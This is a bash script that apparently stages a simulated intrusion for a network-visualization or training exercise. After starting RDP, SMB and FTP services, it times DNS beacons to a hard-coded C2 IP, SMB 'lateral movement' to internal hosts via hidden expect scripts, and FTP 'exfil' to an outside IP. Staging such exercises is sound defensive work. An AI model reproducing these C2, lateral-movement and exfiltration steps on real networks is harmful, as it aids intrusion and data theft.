#!/bin/bash

C2_SERVER="153.62.14.109"
FTP_EXFIL="153.89.194.75"
SECOND_AGENT="10.10.10.102"

# Start XRDP server
xrdp & 

# Start Samba service
smbd & 

# Start ProFTPd service
proftpd &

# Start traffic generator
nohup /viz/traffic_gen.sh &

# Start agent and connect to sever, filter out weird docker traffic for scenario purposes
/viz/agent listen -p "${OS}" -f "(not host 10.10.10.1) and (not host 153.17.52.1) and (not host 127.0.0.11) and (not host 192.168.245.2) and (not host 192.168.120.2)" -s ${VIZSERVER} &

# Have first compromised host talk to the C2 server
if [ "${CALLBACK_ONE}" = true ]; then
	# Wait 60 seconds for RDP "bruteforce" to finish
	sleep 60
	# DNS C2 comms
	for i in {0..10}; do
		timeout 1s dig @${C2_SERVER} > /dev/null 2>&1
		sleep 1
	done

	# Wait 20 seconds before using SMB
	sleep 10

	# Perform lateral movement with SMB
    timeout 20s expect -f /.smb.exp 10.10.10.102

    # We've used 110s

    # This will need to come back to life once agent4 sends data to agent1 to exfil from the network
    sleep 180

    # Perform data exfil from the network
    timeout 30s expect -f /.ftp.exp ${FTP_EXFIL}
fi

#-------------------------------------------------

if [ "${CALLBACK_TWO}" ]; then 
	sleep 110

	# DNS C2 comms
	for i in {0..10}; do
		timeout 1s dig @${C2_SERVER} > /dev/null 2>&1
		sleep 1
	done

	# Wait 20 seconds before using SMB
	sleep 10

	# Perform lateral movement with SMB
    timeout 20s expect -f /.smb.exp 10.10.10.103

    # We've used 150s
fi

#-------------------------------------------------

if [ "${CALLBACK_THREE}" ]; then 
	sleep 160

	# DNS C2 comms
	for i in {0..10}; do
		timeout 1s dig @${C2_SERVER} > /dev/null 2>&1
		sleep 1
	done

	# Wait 20 seconds before using SMB
	sleep 10

	# Perform lateral movement with SMB
    timeout 20s expect -f /.smb.exp 10.10.10.104

    # We've used 200s
fi

#-------------------------------------------------

if [ "${CALLBACK_FOUR}" ]; then 
	sleep 210

	# DNS C2 comms
	for i in {0..10}; do
		timeout 1s dig @${C2_SERVER} > /dev/null 2>&1
		sleep 1
	done

	# Wait 20 seconds before starting data exfil
	sleep 10

	# Perform initial part of exfil with FTP
    timeout 30s expect -f /.ftp.exp 10.10.10.101

    # We've used 260s
fi

#-------------------------------------------------
# After doing scripted tasks, just exist
while [ 1 ]; do
	sleep 10
done